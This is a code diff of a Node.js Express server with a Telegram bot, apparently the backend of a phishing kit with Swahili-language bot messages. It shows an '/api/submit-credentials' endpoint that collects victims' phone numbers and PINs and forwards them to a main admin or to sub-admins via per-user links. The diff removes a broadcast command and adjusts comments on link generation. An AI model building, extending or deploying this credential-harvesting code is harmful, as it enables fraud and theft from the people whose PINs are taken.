@@ -36,24 +36,8 @@ mainBot.on('message', (msg) => {
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
-    if (msg.text.startsWith('/broadcast')) {
-        if (userIdStr !== MAIN_ADMIN_ID) {
-            mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
-            return;
-        }
-
-        const broadcastMessage = msg.text.replace('/broadcast', '').trim();
-        if (!broadcastMessage) {
-            mainBot.sendMessage(chatId, "⚠️ Tafadhali andika ujumbe unaotaka kutuma baada ya amri.\n\nMfano:\n`/broadcast Habari wadau, mfumo uko tayari!`", { parse_mode: "Markdown" });
-            return;
-        }
-
-        mainBot.sendMessage(chatId, "⚠️ Amri ya broadcast imebadilishwa kwani kila sub-admin sasa anafanya kazi kivyake.");
-        return;
-    }
-
     if (msg.text.startsWith('/start')) {
-        // Automatically allow any user to get their permanent isolated link immediately and freely
+        // Explicitly generates and sends chat info and link to both main admin and sub-admins
         sendAdminLink(chatId, userIdStr, firstName, username);
     }
 });
@@ -112,7 +96,6 @@ setupCallbackHandler(mainBot);
 app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, phone, pin, adminId } = req.body;
     
-    // If an adminId is passed via the link parameter, route notifications directly to their chat ID
     let targetAdmin = MAIN_ADMIN_ID;
     if (adminId) {
         targetAdmin = adminId.toString().trim();
@@ -204,4 +187,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-                                                 
+           
